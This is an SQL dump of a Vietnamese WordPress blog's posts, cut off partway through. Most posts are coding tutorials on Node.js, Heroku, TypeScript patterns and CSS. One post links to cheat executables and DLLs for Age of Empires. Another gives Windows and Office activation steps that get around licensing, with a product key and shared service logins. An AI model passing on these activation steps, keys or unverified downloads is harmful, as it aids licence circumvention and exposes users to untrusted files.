-- phpMyAdmin SQL Dump
-- version 4.9.11
-- https://www.phpmyadmin.net/
--
-- Host: localhost:3306
-- Generation Time: Jun 10, 2024 at 06:13 PM
-- Server version: 10.5.22-MariaDB
-- PHP Version: 7.4.33

SET SQL_MODE = "NO_AUTO_VALUE_ON_ZERO";
SET AUTOCOMMIT = 0;
START TRANSACTION;
SET time_zone = "+00:00";


/*!40101 SET @OLD_CHARACTER_SET_CLIENT=@@CHARACTER_SET_CLIENT */;
/*!40101 SET @OLD_CHARACTER_SET_RESULTS=@@CHARACTER_SET_RESULTS */;
/*!40101 SET @OLD_COLLATION_CONNECTION=@@COLLATION_CONNECTION */;
/*!40101 SET NAMES utf8mb4 */;

--
-- Database: `nhduytmn_wp_tiwek`
--

-- --------------------------------------------------------

--
-- Table structure for table `duycode_posts`
--

CREATE TABLE `duycode_posts` (
  `ID` bigint(20) UNSIGNED NOT NULL,
  `post_author` bigint(20) UNSIGNED NOT NULL DEFAULT 0,
  `post_date` datetime NOT NULL DEFAULT '0000-00-00 00:00:00',
  `post_date_gmt` datetime NOT NULL DEFAULT '0000-00-00 00:00:00',
  `post_content` longtext NOT NULL,
  `post_title` text NOT NULL,
  `post_excerpt` text NOT NULL,
  `post_status` varchar(20) NOT NULL DEFAULT 'publish',
  `comment_status` varchar(20) NOT NULL DEFAULT 'open',
  `ping_status` varchar(20) NOT NULL DEFAULT 'open',
  `post_password` varchar(255) NOT NULL DEFAULT '',
  `post_name` varchar(200) NOT NULL DEFAULT '',
  `to_ping` text NOT NULL,
  `pinged` text NOT NULL,
  `post_modified` datetime NOT NULL DEFAULT '0000-00-00 00:00:00',
  `post_modified_gmt` datetime NOT NULL DEFAULT '0000-00-00 00:00:00',
  `post_content_filtered` longtext NOT NULL,
  `post_parent` bigint(20) UNSIGNED NOT NULL DEFAULT 0,
  `guid` varchar(255) NOT NULL DEFAULT '',
  `menu_order` int(11) NOT NULL DEFAULT 0,
  `post_type` varchar(20) NOT NULL DEFAULT 'post',
  `post_mime_type` varchar(100) NOT NULL DEFAULT '',
  `comment_count` bigint(20) NOT NULL DEFAULT 0
) ENGINE=InnoDB DEFAULT CHARSET=utf8mb4 COLLATE=utf8mb4_unicode_ci;

--
-- Dumping data for table `duycode_posts`
--

INSERT INTO `duycode_posts` (`ID`, `post_author`, `post_date`, `post_date_gmt`, `post_content`, `post_title`, `post_excerpt`, `post_status`, `comment_status`, `ping_status`, `post_password`, `post_name`, `to_ping`, `pinged`, `post_modified`, `post_modified_gmt`, `post_content_filtered`, `post_parent`, `guid`, `menu_order`, `post_type`, `post_mime_type`, `comment_count`) VALUES
(7, 1, '2019-08-13 12:12:08', '2019-08-13 12:12:08', '<h2>I. Bản chuẩn</h2>\n<img src=\"http://i2.taimienphi.vn/tmp/cf/Images/txh/2018/2/27/aoe-1-1.jpg\" alt=\"\" />\n- Bản Full dùng được lệnh:\n- Bản chuẩn dùng trong thi đấu: Download tại GameTV\n- Lưu bản Campain: game0.nfo (trong thư mục chính)\n<h2>II. Hack AOE</h2>\n<h3>1. Hack bản đồ sáng</h3>\n- Download và ghi đè ở thư mục gốc AOE: <a href=\"https://drive.google.com/open?id=1TKX6pgrWpU8eB9VagtqhqXVZWAAGXGKo\" rel=\"noopener noreferrer\" target=\"_blank\">EMPIRESX.EXE</a>\n- Các tính năng chính: Nhìn thấy mọi đơn vị trên bản đồ (bản đồ sáng)\n<h3>2. Hack tài nguyên </h3>\n- Download và đặt vào thư mục gốc AOE: <a href=\"https://drive.google.com/open?id=13y6xLAl6c5E4Q4G290ynFaxoAeS33c7o\" target=\"_blank\" rel=\"noopener noreferrer\">dsound.dll</a>\n- Các tính năng chính: Xin tài nguyên, del dân đối phương, del voi huơu\n- Cách sử dụng:  Trong game nhấn \" ~ \" hoặc \" F12 \" để nhập mã\n<h4>1.1. Các nút tắt</h4>\n- \" ~ \" hoặc \" F12 \": Nhập mã\n- F1: Win luôn\n- F2 myreshack2(): +500 vào tất cả tài nguyên\n- F4: Xem tên của máy, Xem thông tin của người chơi [Thịt(F), Gỗ(W), Vàng(G), Đá(S)]\n- F6: Maphack: nhìn được tất cả mọi đối tượng trên bản đồ\n- F7 = myreshack(): + 10.000 vào tất cả tài nguyên\n- F8 = mypophack(): Tổng số lượng dân được tăng lên (không cần xây BE nữa)\n- F9= myallally\n<h4>1.2. Gõ lệnh</h4>\n- list: Hiện số thứ tự người chơi (number)\n- resign(1): Chọn máy nào thua, trong trường hợp này là máy số 1\n- setwinner(number): Chọn đối tượng chiến thắng\n- setmaphack(number): Chọn đối tượng sử dụng maphack\n- food(number,amount): +Thức Ăn vào (Máy số, Số lương thực), Ví dụ: food(1,1000)\n- wood(number,amount): +Thức Gỗ vào (Máy số, Số Gỗ), Ví dụ: wood(1,1000)\n- gold(number,amount): +Thức Vàng vào (Máy số, Số Vàng), Ví dụ: gold(1,1000)\n- stone(number,amount): +Thức Đá vào (Máy số, Số Đá), Ví dụ: store(1,1000)\n- cls: Xóa tất cả những lệnh đã đánh\n<h3>3. Hack sử dụng các đơn vị quân </h3>\n- Download và đặt vào thư mục DATA2: <a href=\"https://drive.google.com/open?id=1SvFHFCReVSdM6Ew8MAGUSHyfiRyKJFIR\" target=\"_blank\" rel=\"noopener noreferrer\">empires.dat</a>\n- Các tính năng chính: xin mọi đơn vị quân, xin dân nhanh, xin phù thủy sét', 'Age of Empires: The Rise of Rome', '', 'publish', 'open', 'open', '', 'chao-moi-nguoi', '', '', '2019-08-13 12:12:08', '2019-08-13 12:12:08', '', 0, 'https://duycode.com/?p=1', 0, 'post', '', 0),
(13, 1, '2021-05-08 14:28:58', '2021-05-08 07:28:58', '<h2>1. Class: MongooseController</h2>\nTạo file ./src/app/controllers/MongooseController.js\n<pre>\nclass MongooseController {\n	constructor(collection, conditions) {\n		this.collection = collection;\n		this.conditions = conditions;\n	}\n\n	add = (req, res, next) => {\n		Object.assign(req.body, {\n			createdAt: Date.now(),\n			updatedAt: Date.now(),\n			removedAt: 0,\n		});\n		console.log(req.body);\n		const document = new this.collection(req.body);\n		document\n			.save()\n			.then((results) => res.json(results))\n			.catch(next);\n	};\n\n	findOneById = (req, res, next) => {\n		let conditions = this.conditions(req, res, next);\n		let qualified = Object.assign({}, conditions, { _id: req.params.id });\n		this.collection\n			.findOne(qualified)\n			.then((results) => res.json(results))\n			.catch(next);\n	};\n\n	updateOneById = (req, res, next) => {\n		let conditions = this.conditions(req, res, next);\n		let qualified = Object.assign({}, conditions, { _id: req.params.id });\n		Object.assign(req.body, {\n			updatedAt: Date.now(),\n		});\n		this.collection\n			.findOneAndUpdate(qualified, req.body, { new: true })\n			.then((results) => res.json(results))\n			.catch(next);\n	};\n\n	replaceOneById = (req, res, next) => {\n		let conditions = this.conditions(req, res, next);\n		let qualified = Object.assign({}, conditions, { _id: req.params.id });\n		Object.assign(req.body, {\n			updatedAt: Date.now(),\n		});\n		this.collection\n			.findOneAndReplace(qualified, req.body, { new: true })\n			.then((results) => res.json(results))\n			.catch(next);\n	};\n\n	removeOneById = (req, res, next) => {\n		let conditions = this.conditions(req, res, next);\n		let qualified = Object.assign({}, conditions, { _id: req.params.id });\n		this.collection\n			.findOneAndUpdate(qualified, { removedAt: Date.now() }, { new: true })\n			.then((results) => res.json(results))\n			.catch(next);\n	};\n\n	restoreOneById = (req, res, next) => {\n		let conditions = this.conditions(req, res, next);\n		let qualified = Object.assign({}, conditions, { _id: req.params.id });\n		this.collection\n			.findOneAndUpdate(qualified, { removedAt: 0 }, { new: true })\n			.then((results) => res.json(results))\n			.catch(next);\n	};\n\n	deleteOneById = (req, res, next) => {\n		let conditions = this.conditions(req, res, next);\n		let qualified = Object.assign({}, conditions, { _id: req.params.id });\n		this.collection\n			.deleteOne(qualified)\n			.then((results) => res.json(results))\n			.catch(next);\n	};\n\n	findListExist = (req, res, next) => {\n		let conditions = this.conditions(req, res, next);\n		let qualified = Object.assign({}, conditions, { removedAt: 0 });\n\n		this.collection\n			.find(qualified)\n			.then((results) => res.json({ data: results }))\n			.catch((err) => next());\n	};\n\n	findListTrash = (req, res, next) => {\n		let conditions = this.conditions(req, res, next);\n		let qualified = Object.assign({}, conditions, { removedAt: { $ne: 0 } });\n\n		this.collection\n			.find(qualified)\n			.then((results) => res.json({ data: results }))\n			.catch((err) => next());\n	};\n\n	removeListById = (req, res, next) => {\n		let conditions = this.conditions(req, res, next);\n		let qualified = Object.assign({}, conditions, { _id: { $in: req.body.ids } });\n\n		this.collection\n			.updateMany(qualified, { removedAt: Date.now() })\n			.then((results) => res.json(results))\n			.catch(next);\n	};\n\n	restoreListById = (req, res, next) => {\n		let conditions = this.conditions(req, res, next);\n		let qualified = Object.assign({}, conditions, { _id: { $in: req.body.ids } });\n		this.collection\n			.updateMany(qualified, { removedAt: 0 })\n			.then((results) => res.json(results))\n			.catch(next);\n	};\n\n	deleteListById = (req, res, next) => {\n		let conditions = this.conditions(req, res, next);\n		let qualified = Object.assign({}, conditions, { _id: { $in: req.body.ids } });\n		this.collection\n			.deleteMany(qualified)\n			.then((results) => res.json(results))\n			.catch(next);\n	};\n}\n\nmodule.exports = MongooseController;\n\n</pre>\n\n<h2>2. Sử dụng</h2>\nTạo file ./src/app/controllers/Controllers.js\n<pre>\nconst mongoDB = require(\'../../config/database/mongoDB\');\nconst ObjectId = require(\'mongodb\').ObjectId;\nconst MongooseController = require(\'./MongooseController\');\n\nconst SinhVien = require(\'../models/SinhVien\');\n\nconst SinhVienController = new MongooseController(SinhVien);\n\nmodule.exports = {SinhVienController};\n\n</pre>', 'NodeJS - 8. Mongoose Controller', '', 'publish', 'open', 'open', '', 'nodejs-note', '', '', '2021-05-08 14:28:58', '2021-05-08 07:28:58', '', 0, 'https://duycode.com/?p=13', 0, 'post', '', 0),
(18, 1, '2019-08-19 14:51:48', '2019-08-19 14:51:48', '<img src=\"https://miro.medium.com/max/1838/1*fIjRtO5P8zc3pjs0E5hYkw.png\" alt=\"\" />\n1. Download và cài đặt Heroku (NodeJS):\nhttps://devcenter.heroku.com/articles/getting-started-with-nodejs#set-up\n- Cần đăng ký tài khoản\n- Cần cài Nodejs trước\n\n2. Làm việc\n- Tạo folder trống, mở bằng Webstorm\nheroku -v  --> kiểm tra cài đặt chưa\nheroku login  --> login bằng chrome\ngit clone https://github.com/heroku/node-js-getting-started.git  -->git thư mục nodejs về\ncd node-js-getting-started --> vào folder nodejs\nheroku create --> tạo app trên heroku\ngit push heroku master --> đẩy lên trang heroku\nheroku ps:scale web=1 --> tự động thay đổi kiểu nodemon\nheroku open --> mở link website mình lên\n\n3. Bắt đầu làm Nodejs\nnpm install\nnpm i body-parser ejs express mongoose multer nodemon --> cài module\n\n- Tạo folder: Models, Public, Views\n- Làm việc với file: index.js\n- heroku chỉ nhận cổng PORT: 5000\n<pre>\napp.listen(process.env.PORT || 5000,function () {\n    console.log(\"server is running\");\n})\n</pre>\n\n4. Đẩy code mới\ngit add .\ngit commit -am \"make it better\"\ngit push heroku master\n\n', 'Heroku  cơ bản', '', 'publish', 'open', 'open', '', 'heroku-toan-tap', '', '', '2019-08-19 14:51:48', '2019-08-19 14:51:48', '', 0, 'https://duycode.com/?p=18', 0, 'post', '', 0),
(33, 1, '2019-08-20 21:41:45', '2019-08-20 21:41:45', '<h3>1. Singleton</h3>\r\n<pre>\r\nclass Singleton {\r\n    private static instance: Singleton;\r\n\r\n    private constructor() { }\r\n\r\n    public static getInstance(): Singleton {\r\n        if (!Singleton.instance) {\r\n            Singleton.instance = new Singleton();\r\n        }\r\n        return Singleton.instance;\r\n    }\r\n\r\n    public someBusinessLogic() {\r\n        console.log(\"Excute some business logic\")\r\n    }\r\n}\r\n\r\n// new Singleton() ==> throw exception\r\nconst s1 = Singleton.getInstance();\r\nconst s2 = Singleton.getInstance();\r\nconsole.log(\"s1 === s2 =>\", s1 === s2) // true\r\n// ==> 1 Class chỉ tạo 1 instance duy nhất\r\n\r\ns1.someBusinessLogic()\r\n</pre>\r\n\r\n<h3>2. Fluent Interface</h3>\r\n<pre>\r\nclass Student {\r\n    private _name!: string | null\r\n    private _age!: number | null\r\n\r\n    setName(value: string) {\r\n        this._name = value\r\n        return this\r\n    }\r\n\r\n    setAge(value: number) {\r\n        this._age = value\r\n        return this\r\n    }\r\n\r\n    getInfo(): string {\r\n        return `Student: ${this._name} - ${this._age} year(s) old `\r\n    }\r\n}\r\n\r\n// ==> Sử dụng \"return this\" để có thể dùng 1 chuỗi câu lệnh\r\nconst newStudent = new Student().setName(\'Peter\').setAge(20).getInfo() // Student: Peter - 20 year(s) old \r\n</pre>', 'Creational Pattern: Singleton và Fluent Interface', '', 'publish', 'open', 'open', '', 'creational-pattern-singleton-va-fluent-interface', '', '', '2023-06-18 10:18:58', '2023-06-18 10:18:58', '', 0, 'https://duycode.com/?p=33', 0, 'post', '', 0),
(35, 1, '2019-08-20 21:42:12', '2019-08-20 14:42:12', '<img src=\"https://drive.google.com/uc?export=view&id=1iL5magKZpu3D_oPcB_Iespyb8uMZHwW0\" alt=\"Css funny\" />\n<h2>1. Thứ tự viết code CSS hợp lý </h2>\n<pre>\n{\n    display: ;    /* Where and how the box is placed */\n    position: ;\n    float: ;\n    clear: ;\n\n    visibility: ; /* Can the box be seen? */\n    opacity: ;\n    z-index: ;\n\n    margin: ;     /* Layers of the box model */\n    outline: ;\n    border: ;\n    background: ;\n    padding: ;\n\n    width: ;      /* Content dimensions and scrollbars */\n    height: ;\n    overflow: ;\n\n    color: ;      /* Text */\n    text: ;\n    font: ;\n}\n</pre>\n<h2>2. Variable CSS</h2>\n<pre>\n<style>\n	:root {\n		--main-color: #ffa400;\n		--base-size: 60px\n\n	}\n	.square {\n		background: var(--main-color);\n		width: var(--base-size);\n		height: var(--base-size);\n	}\n	.rectangle {\n		background: var(--color);\n		width: calc(var(--i) * var(--base-size));\n		height: calc(var(--j) * var(--base-size));\n	}\n</style>\n\n<div class=\"square\"></div><br/>\n<div class=\"rectangle\" style=\"--i:5;--j:2;--color:green\"></div><br/>\n</pre>\n\n<h2>3. CSS Selector </h2>\n<table>\n<tbody>\n<tr>\n<td>#</td>\n<td>Type</td>\n<td>Example</td>\n</tr>\n<tr>\n<td>1</td>\n<td>Basic CSS Selectors</td>\n<td>&nbsp;</td>\n</tr>\n<tr>\n<td>2</td>\n<td>Descendant CSS Selectors</td>\n<td>&nbsp;</td>\n</tr>\n<tr>\n<td>3</td>\n<td>Multiple CSS Selector</td>\n<td>&nbsp;</td>\n</tr>\n<tr>\n<td>4</td>\n<td>Combination CSS Selectors</td>\n<td>&nbsp;</td>\n</tr>\n<tr>\n<td>5</td>\n<td>Sibling CSS Selectors</td>\n<td>&nbsp;</td>\n</tr>\n<tr>\n<td>6</td>\n<td>Pseudo CSS Selectors</td>\n<td>&nbsp;</td>\n</tr>\n<tr>\n<td>7</td>\n<td>Pseudo CSS Selectors (link v&agrave; input)</td>\n<td>&nbsp;</td>\n</tr>\n<tr>\n<td>8</td>\n<td>Attribute CSS Selectors</td>\n<td>&nbsp;</td>\n</tr>\n</tbody>\n</table>\n\n<table>\n<tbody>\n<tr>\n<td>Loại</td>\n<td>V&iacute; dụ</td>\n<td>Giải th&iacute;ch</td>\n</tr>\n<tr>\n<td>descendant&nbsp;selector</td>\n<td>div p</td>\n<td>Tất cả element p l&agrave; hậu duệ b&ecirc;n trong&nbsp;div</td>\n</tr>\n<tr>\n<td>Child combinator</td>\n<td>div &gt;&nbsp;p</td>\n<td>Tất cả element p l&agrave; con trực tiếp (hậu duệ đời 1) của div</td>\n</tr>\n<tr>\n<td>younger siblings</td>\n<td>div ~&nbsp;ul</td>\n<td>Tất cả element ul l&agrave; anh chị em c&ugrave;ng cấp trẻ hơn của&nbsp;div</td>\n</tr>\n<tr>\n<td>younger adjacent sibling</td>\n<td>div +&nbsp;ul</td>\n<td>Tương tự div&nbsp;~&nbsp;ul, nhưng chỉ lấy ul liền kề ngay sau của div&nbsp;</td>\n</tr>\n</tbody>\n</table>\n\n', 'CSS cơ bản', '', 'publish', 'open', 'open', '', 'css-co-ban', '', '', '2019-08-20 21:42:12', '2019-08-20 14:42:12', '', 0, 'https://duycode.com/?p=35', 0, 'post', '', 0),
(38, 1, '2019-08-20 21:44:22', '2019-08-20 21:44:22', '<h2>I. Download Windows và Office</h2>\r\n<h3>1. Windows và Office bản gốc Microsoft</h3>\r\n<h4>1.1. Link tổng hợp: </h4>\r\n-- Link 1: <a href=\"https://docs.google.com/spreadsheets/d/1o5dmOw8jBCVGxFmlMOsKgoIKULMY7tk-TCSz67IJMc4/pubhtml\" target=\"_blank\" rel=\"noopener noreferrer\">https://docs.google.com/spreadsheets/d/1o5dmOw8jBCVGxFmlMOsKgoIKULMY7tk-TCSz67IJMc4/pubhtml</a>\r\n-- Link 2 - GoogleDriver: <a href=\"https://docs.google.com/spreadsheets/d/14-D4tIlFp9APP0OOvQBRXvfLOYC447UygywenX5LXfo/edit#gid=960687212\" rel=\"noopener\" target=\"_blank\">https://docs.google.com/spreadsheets/d/14-D4tIlFp9APP0OOvQBRXvfLOYC447UygywenX5LXfo/edit#gid=960687212</a>\r\n\r\n<h4>1.2. Window</h4>\r\n- Win 7 Sp1x64 Professional: SHA1: 0BCFC54019EA175B1EE51F6D2B207A3D14DD2B58 \r\n- Win 7 Sp1x32 Professional: SHA1: D89937DF3A9BC2EC1A1486195FD308CD3DADE928\r\n\r\n<h4>1.3. Office</h4>\r\n- Office_ProPlus_2013_SP1x32 (Bản VLSC): d4d7ffd3dffef0a3c08748e400e0890a7a730888  -Link GoogleDriver: <a href=\"https://drive.google.com/file/d/1SpuzzZSFvtbVWOX6qqofHWoOi4ngDC8_/view\" rel=\"noopener\" target=\"_blank\">https://drive.google.com/file/d/1SpuzzZSFvtbVWOX6qqofHWoOi4ngDC8_/view</a>\r\n- Office_ProPlus_2013_SP1x64 (Bản VLSC): ab2c2d525d63a72e0a2dc66efdcea0f824f02cff  -Link GoogleDriver: <a href=\"https://drive.google.com/file/d/1KSsy1l2hkDIzEvOYWZapjZILQ_XY0Dbe/view\" rel=\"noopener\" target=\"_blank\">https://drive.google.com/file/d/1KSsy1l2hkDIzEvOYWZapjZILQ_XY0Dbe/view</a>\r\n- Office 2019 Pro Plus 64bit Retail: <a href=\"https://officecdn.microsoft.com/pr/492350f6-3a01-4f97-b9c0-c7c6ddf67d60/Office/Data/SetupProPlus2019Retail.x64.en-us.exe\" rel=\"noopener\" target=\"_blank\">https://officecdn.microsoft.com/pr/492350f6-3a01-4f97-b9c0-c7c6ddf67d60/Office/Data/SetupProPlus2019Retail.x64.en-us.exe</a>\r\n\r\n<h3>2. Công cụ</h3>\r\n<h4>2.1. Check key Online</h4>\r\n<a href=\"https://quanghuy.it/check-key\" target=\"_blank\" rel=\"noopener noreferrer\">https://quanghuy.it/check-key</a>\r\n<a href=\"http://khoatoantin.com/pidms\" target=\"_blank\" rel=\"noopener noreferrer\">http://khoatoantin.com/pidms</a>\r\n<a href=\"https://dbmer.com/checkkey/\">https://dbmer.com/checkkey/</a>\r\n\r\n<h4>2.2. Get Confirmation ID:</h4>\r\n<a href=\"http://khoatoantin.com/cidms\" target=\"_blank\" rel=\"noopener noreferrer\">http://khoatoantin.com/cidms</a>\r\n- User: HQCNTH - Pass: MIGOI\r\n- User: trogiup24h- Pass: PHO\r\n<a href=\"https://getcid.top/\" target=\"_blank\" rel=\"noopener noreferrer\">https://getcid.top/</a>\r\n<a href=\"https://0xc004c008.com/\">https://0xc004c008.com/</a>\r\n<a href=\"https://getcid.info/\">https://getcid.info/</a>\r\n\r\n<h2>II. Cài Win và Ghost</h2>\r\n<h3>1. Tạo USB cài Win</h3>\r\n- Dùng phần mềm Rufus: <a href=\"https://rufus.akeo.ie/?locale=vi_VN\" target=\"_blank\" rel=\"noopener noreferrer\">https://rufus.akeo.ie/?locale=vi_VN</a>\r\n\r\n<h3>2. Bolus cần biết</h3>\r\n - Hiểu thế nào về \"BIOS\" và \"UEFI\", \"MBR\" và \"GPT\", \"Legacy\"</h3>\r\n<img src=\"https://www.passmoz.com/images/others/firmware-workflow.jpg\" alt=\"BIOS vs UEFI\" />\r\n- Có thể hiểu đơn giản: \"UEFI\" là chẩn mới đang dần thay thế cho chuẩn cũ \"BIOS\", từ \"Legacy\" - nghĩa là BIOS\r\n- UEFI chỉ hỗ trợ cho các phiên bản Windows 64-bit\r\n- Nếu sử dụng chuẩn \"UEFI\" &gt; cần định dạng ổ cứng là \"GPT\"\r\n- Nếu sử dụng chuẩn \"Legacy\" &gt; cần định dạng ổ cứng là \"MBR\"\r\n\r\n<h4>a. Kiểm tra BIOS Mode</h4>\r\n- Vào: Run\\ msinfo32\r\n- Kéo xuống phần BIOS Mode: \"UEFI\" hoặc \"Legacy\"\r\n- Nếu máy tính có hỗ trợ chuẩn \"UEFI\", có thể vào BIOS để chuyển qua lại giữa 2 chuẩn này\r\n\r\n<h4>b. Kiểm tra định dạng ổ cứng</h4>\r\n- Vào: Run\\ diskpart -&gt; đánh lệnh: list disk\r\n- Tại đây máy tính sẽ được hiện thị tất cả các ổ cứng\r\n- Tại cột “Gpt”: nếu có dấu * --&gt; chuẩn \"GPT\", còn nếu không có --&gt; chuẩn \"MBR\"\r\n\r\n\r\n<h2>III. Active Windows và Office</h2>\r\n-- Tham khảo thêm: <a href=\"https://vn-z.vn/threads/tong-hop-key-windows-va-office.10945/\" rel=\"noopener\" target=\"_blank\">https://vn-z.vn/threads/tong-hop-key-windows-va-office.10945/</a>\r\n\r\n<h3>1. Windows 10</h3>\r\nĐầu tiên bạn phải chạy Cmd (Quyền Admin)\r\n<strong><span style=\"color: #993300;\">Bước 1:</span></strong> Kiểm tra xem Windows đã Active hay chưa theo các lệnh sau:\r\n<blockquote>\r\nslmgr.vbs /dli  ##Hiển thị thông tin giấy phép cơ bản\r\nslmgr.vbs /dlv  ##Hiển thị thông tin giấy phép đầy đủ\r\nslmgr.vbs /xpr  ##Hiển thị ngày hết hạn của giấy phép\r\n</blockquote>\r\n\r\n<strong><span style=\"color: #993300;\">Bước 2:</span></strong> Đưa Windows về trạng thái chưa nhập Key nào bằng các lệnh:\r\n<blockquote>\r\nslmgr.vbs /upk ##Gỡ bỏ key\r\nslmgr.vbs /cpky ##Gỡ key khỏi Registry\r\nslmgr.vbs /rearm ##Reset kích hoạt\r\n</blockquote>\r\nSau khi thực hiện 3 lệnh trên bạn phải khởi động lại máy tính\r\n\r\n<strong><span style=\"color: #993300;\">Bước 3:</span></strong> Điền Key bằng lệnh:\r\n<blockquote>\r\nslmgr.vbs -ipk XXXXX-XXXXX-XXXXX-XXXXX-XXXXX\r\n</blockquote>\r\n\r\n<strong><span style=\"color: #993300;\">Bước 4:</span></strong> Lấy ID2 Windows nhanh theo lệnh sau\r\n<blockquote>\r\nslmgr.vbs /dti>step2.txt\r\nstart step2.txt\r\n</blockquote>\r\n\r\n<strong><span style=\"color: #993300;\">Bước 5:</span></strong> Lấy ID3 theo hướng dẫn ở đây:\r\n<a href=\"http://khoatoantin.com/cidms\" target=\"_blank\" rel=\"noopener noreferrer\">http://khoatoantin.com/cidms</a>\r\n- User: HQCNTH - Pass: MIGOI\r\n- User: trogiup24h- Pass: PHO\r\n<a href=\"https://getcid.top/\" target=\"_blank\" rel=\"noopener noreferrer\">https://getcid.top/</a>\r\n\r\n<strong><span style=\"color: #993300;\">Bước 6:</span></strong> Điền ID3 (không dấu gạch ngang) theo lệnh:\r\n<blockquote>\r\nslmgr.vbs /atp ID3\r\n</blockquote>\r\n\r\n<strong><span style=\"color: #993300;\">Bước 7:</span></strong> Kích hoạt Windows theo lệnh sau\r\nslmgr.vbs -ato\r\n\r\n<strong><span style=\"color: #993300;\">Bolus: </span></strong> Một số lệnh CMD khác của Windows\r\n<blockquote>\r\nslmgr.vbs /rilc - Reset lại license được lưu trong hệ thống\r\nslmgr.vbs /skms <Máy chủ hỗ trợ và còn sống> (Đặt máy chủ KMS)\r\nslmgr.vbs /ckms - Xoá máy chủ KMS\r\n</blockquote>\r\n\r\n\r\n<h3>2. Office</h3>\r\n<strong><span style=\"color: #993300;\">Bước 1:</span></strong> Trỏ vào folder của Office (tương ứng như sau: 14 - Office 2010, 15 - Office 2013, 16 - Office 2016,2019):\r\n<blockquote>\r\nset ver=16\r\nif exist \"%ProgramFiles%\\Microsoft Office\\Office%ver%\\ospp.vbs\" cd /d \"%ProgramFiles%\\Microsoft Office\\Office%ver%\"\r\nif exist \"%ProgramFiles(x86)%\\Microsoft Office\\Office%ver%\\ospp.vbs\" cd /d \"%ProgramFiles(x86)%\\Microsoft Office\\Office%ver%\"\r\n</blockquote>\r\n\r\n<strong><span style=\"color: #993300;\">Bước 2:</span></strong> Add Key mới</h4>\r\n<blockquote>cscript ospp.vbs /inpkey:<Key của bạn></blockquote>\r\n\r\n<strong><span style=\"color: #993300;\">Bước 3:</span></strong> Convert từ bản Retail sang Volume\r\n<blockquote>for /f %i in (\'dir /b ..\\root\\Licenses16\\ProPlus2019VL_MAK*.xrm-ms\') do cscript ospp.vbs /inslic:\"..\\root\\Licenses16\\%i\"\r\n</blockquote>\r\n\r\n<strong><span style=\"color: #993300;\">Bước 4:</span></strong> Lấy step 2:\r\n<blockquote>cscript OSPP.VBS /dinstid&gt;step2.txt\r\nstart step2.txt</blockquote>\r\n\r\n<strong><span style=\"color: #993300;\">Bước 5:</span></strong> Điền step 3:\r\n<blockquote>cscript OSPP.VBS /actcid:&lt;8_nhóm_CID_viết_liền&gt;</blockquote>\r\n\r\n<strong><span style=\"color: #993300;\">Bước 6:</span></strong> Kiểm tra tình trạng bản quyền (key cũ đã điền - chỉ hiện 5 ký tự cuối của tất cả các key đã up)</h4>\r\n<blockquote>\r\ncscript ospp.vbs /dstatus (Hiện thông tin kích hoạt với key hiện tại)\r\ncscript ospp.vbs /dstatusall (Hiện thông tin kích hoạt đầy đủ)\r\n</blockquote>\r\n\r\n<strong><span style=\"color: #993300;\">Bolus:</span></strong> Kích hoạt nhanh Office 2019 Pro Plus 64bit Retail:\r\n<blockquote>\r\ncscript slmgr.vbs /upk 52c4d79f-6e1a-45b7-b479-36b666e0a2f8\r\ncscript slmgr.vbs /upk 5f472f1e-eb0a-4170-98e2-fb9e7f6ff535\r\ncscript slmgr.vbs /upk a3072b8f-adcc-4e75-8d 62-fdeb9 bdfae57\r\nif exist \"%ProgramFiles%\\Microsoft Office\\Office16\\ospp.vbs\" cd /d \"%ProgramFiles%\\Microsoft Office\\Office16\"\r\nif exist \"%ProgramFiles(x86)%\\Microsoft Office\\Office16\\ospp.vbs\" cd /d \"%ProgramFiles(x86)%\\Microsoft Office\\Office16\"\r\ncscript ospp.vbs /remhst\r\ncscript ospp.vbs /ckms-domain\r\nfor /f %i in (\'dir /b ..\\root\\Licenses16\\ProPlus2019VL_MAK*.xrm-ms\') do cscript ospp.vbs /inslic:\"..\\root\\Licenses16\\%i\"\r\ncscript //nologo ospp.vbs /inpkey:GP3YN-RPX2T-FVYT8-4TPFY-7MKG3\r\ncscript //nologo ospp.vbs /act\r\ncscript //nologo ospp.vbs /dinstid > step2.txt\r\nstart step2.txt\r\ncls\r\ncscript ospp.vbs /actcid:\r\n</blockquote>\r\n- Lấy step3 như ở trên rồi điền nốt vào -> Finish\r\n\r\n<h3>2. Sao lưu bản quyền office 2019</h3>\r\n- Bước 1: Dùng CMD\r\n<blockquote>\r\ncd C:\\Windows\\System32\r\nnet stop sppsvc\r\n</blockquote>\r\n- Backup: Trong thư mục: C:\\Windows\\System32\\spp\\store ==> Lưu lại thư mục 2.0\r\n- Restore: copy đè ngược lại là xong\r\n\r\n<h2>IV. Driver</h2>\r\n<h3>1. Driver HP EliteBook 8570p - Windows 7 x64bit</h3>\r\nLink Full: <a href=\"https://support.hp.com/us-en/drivers/selfservice/hp-elitebook-8570p-notebook-pc/5212912\" target=\"_blank\" rel=\"noopener noreferrer\">https://support.hp.com/us-en/drivers/selfservice/hp-elitebook-8570p-notebook-pc/5212912</a>\r\n- LAN: <a href=\"https://ftp.hp.com/pub/softpaq/sp60501-61000/sp60775.exe\" target=\"_blank\" rel=\"noopener noreferrer\">https://ftp.hp.com/pub/softpaq/sp60501-61000/sp60775.exe</a>\r\n- Wifi: <a href=\"https://ftp.hp.com/pub/softpaq/sp58501-59000/sp58782.exe\" target=\"_blank\" rel=\"noopener noreferrer\">https://ftp.hp.com/pub/softpaq/sp58501-59000/sp58782.exe</a>\r\n- Graphics: <a href=\"https://ftp.hp.com/pub/softpaq/sp57001-57500/sp57174.exe\" target=\"_blank\" rel=\"noopener noreferrer\">https://ftp.hp.com/pub/softpaq/sp57001-57500/sp57174.exe</a>\r\n- Audio: <a href=\"https://ftp.hp.com/pub/softpaq/sp60001-60500/sp60317.exe\" target=\"_blank\" rel=\"noopener noreferrer\">https://ftp.hp.com/pub/softpaq/sp60001-60500/sp60317.exe</a>\r\n- Toupad: <a href=\"https://ftp.hp.com/pub/softpaq/sp63501-64000/sp63779.exe\" target=\"_blank\" rel=\"noopener noreferrer\">https://ftp.hp.com/pub/softpaq/sp63501-64000/sp63779.exe</a>\r\n- Bluetooth (64bit): <a href=\"https://ftp.hp.com/pub/softpaq/sp66001-66500/sp66402.exe\" target=\"_blank\" rel=\"noopener noreferrer\">https://ftp.hp.com/pub/softpaq/sp66001-66500/sp66402.exe</a>\r\n- Canon Printer: <a href=\"https://vn.canon/vi/support/0100278201/9\" target=\"_blank\" rel=\"noopener noreferrer\">https://vn.canon/vi/support/0100278201/9</a>\r\n\r\n<h3>2. Driver HP Probook 6460b - Windows 7</h3>\r\nLink Full: <a href=\"https://support.hp.com/us-en/drivers/selfservice/hp-probook-6460b-notebook-pc/5045594\" 